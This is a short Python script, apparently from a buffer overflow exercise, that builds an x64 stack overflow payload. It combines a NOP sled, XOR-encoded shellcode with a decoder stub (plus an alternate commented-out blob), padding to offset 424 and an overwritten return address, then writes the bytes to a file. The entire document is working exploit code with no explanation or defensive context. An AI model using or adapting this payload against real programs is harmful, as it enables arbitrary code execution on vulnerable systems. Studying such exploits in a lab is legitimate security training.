import struct

offset = 424
"""
buf =  b""
buf += b"\x90"*160
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xfdf\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x1d\xcf\x93\xea\xfb\x46\x3a"
buf += b"\xfb\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x77\xe6\xcb\x73\x91\x44\x65\x91\x1c\x91\x9c\xef\xb3"
buf += b"\xd1\x72\x42\x1f\xcf\x92\x51\x3b\xee\x02\x9e\x4c\x87"
buf += b"\x1a\x0c\x91\x56\x60\x91\x37\x97\x9c\xef\x91\x45\x64"
buf += b"\xb3\xe2\x01\xf9\xcb\xa3\x49\x3f\x8e\xeb\xa5\xa8\xb2"
buf += b"\x62\x0e\x81\xd4\x7f\xa6\xfd\xc5\x88\x2e\x3a\xa8\x55"
buf += b"\x46\x74\xb8\xac\x0e\xb3\x1d\x12\xca\x93\xea\xfb\x46"
buf += b"\x3a\xfb"
"""
buf =  b""
buf += b"\x90"*160
buf += b"\x48\x31\xc9\x48\x81\xe9\xf1\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x1e\x6d\x24\x13\x45\x42\x89"
buf += b"\x9c\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x56\x5c\xed\x5b\xc4\xab\x7f\x63\xe1\x92\x6c\x9e\x40"
buf += b"\xad\x76\x63\xe1\x25\x9f\x84\xa8\xae\x35\x94\xbc\xf1"
buf += b"\x4f\x5b\x74\x1a\xae\xd4\x33\x95\xdb\xec\xba\xa0\x7d"
buf += b"\x61\xda\xd9\x01\x71\xe5\x81\x88\x0a\xad\x8e\x9d\x53"
buf += b"\x70\x96\x5b\x09\xf3\x80\x23\xdb\x4f\xe6\x87\x5a\xbb"
buf += b"\x08\x7e\x71\xf7\x84\x88\x21\xab\x8e\x9d\x71\xe4\x80"
buf += b"\xaa\xf4\x3d\xeb\xb9\x43\xe8\xdb\x97\xfd\x99\xba\xc0"
buf += b"\x82\xaf\x65\xcd\x69\x9a\xef\xb7\x68\x8f\xde\xb1\x43"
buf += b"\x7a\x66\xca\x4c\xaf\x57\x04\x04\xf6\x81\x98\x1b\xe7"
buf += b"\xde\xe2\x9c"


eip_num = 0x00007fffffffe1bc
#ebp_num = eip_num-200

#ebp = struct.pack("<Q", ebp_num)

eip = struct.pack("<Q", eip_num)

buf+= b"\x90"*(offset-len(buf))

#buf+=ebp
buf+=eip

f=open('exploit_x64_demo.txt','wb')

f.write(buf)
f.close()